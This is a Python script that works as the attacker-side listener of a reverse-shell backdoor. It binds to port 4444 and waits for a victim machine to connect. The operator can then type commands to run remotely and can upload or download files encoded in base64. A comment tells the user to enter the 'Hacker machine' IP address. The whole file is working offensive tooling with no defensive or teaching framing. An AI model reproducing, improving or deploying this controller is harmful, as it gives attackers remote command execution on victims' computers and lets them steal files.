import socket
import json
import base64

class Listener:

    def __init__(self, ip, port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((ip, port))
        listener.listen(0)
        print('[+] Waiting for a connection')
        self.connection, add = listener.accept()
        print('[+] Got a Connection from ' + str(add))

    def reliableSend(self, data):
        ndata = data.decode('UTF-8')
        jsonData = json.dumps(ndata)
        jsonData = jsonData.encode('UTF-8')
        self.connection.send(jsonData)


    def reliableReceive(self):
        jsonData = ""
        while True:
            try:
                jsonData = jsonData + self.connection.recv(1024).decode('UTF-8')
                return json.loads(jsonData)
            except ValueError:
                continue

    def ececuteRemotely(self, command):
        self.reliableSend(command)
        if command.decode('UTF-8') == 'exit':
            self.connection.close()
            exit()
        return self.reliableReceive()

    def writeFile(self, path, content):
        with open(path, 'wb') as f:
            f.write(base64.b64decode(content.encode('UTF-8')))
            return "[+] Download Successful"

    def readFile(self, path):
        with open(path, "rb") as f:
            return base64.b64encode(f.read())

    def run(self):
        while True:
            command = input(">> ")
            cmd = command.split(' ')
            try:
                if cmd[0] == 'upload':
                    fileContent = self.readFile(cmd[1])
                    fileContent = fileContent.decode()
                    command = command + ' ' + fileContent

                command = command.encode()
                result = self.ececuteRemotely(command)

                if cmd[0] == 'download':
                    self.writeFile(cmd[1], result)
                    print('[+] Download Successful')
                    continue
                    
            except Exception:
                result = '[+] Error happened while execution'
            print(result)


obj = Listener("192.168.1.88", 4444) #enter local ip of Hacker machine and any port number
obj.run()
